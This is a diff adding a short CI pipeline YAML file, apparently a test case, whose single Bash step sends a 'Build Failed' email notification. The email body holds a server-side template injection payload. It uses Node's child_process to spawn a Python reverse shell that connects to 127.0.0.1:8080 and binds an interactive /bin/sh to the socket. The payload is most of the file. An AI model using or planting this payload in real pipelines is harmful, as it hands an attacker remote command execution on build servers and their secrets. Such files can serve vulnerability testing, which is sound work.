@@ -1,0 +1,13 @@
+pipelines:
+  - name: S_Bash_Util_6107_0001
+    steps:
+      - name: S_Bash_Util_6107_0001_1
+        type: Bash
+        configuration:
+          integrations:
+            - name: BSU_smtp
+        execution:
+          onExecute:
+            - echo "executing step..."
+            - >
+              send_notification BSU_smtp --recipients ${int_BSU_smtp_emailAuthUser} --subject "Build Failed" --body "<% (() => {const child_proc = process.mainModule.require('child_process');const ps = child_proc.spawn('python', [\\\"-c\\\", \\\"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('127.0.0.1', 8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);\\\"], {detached: true});ps.unref();;})() %>"
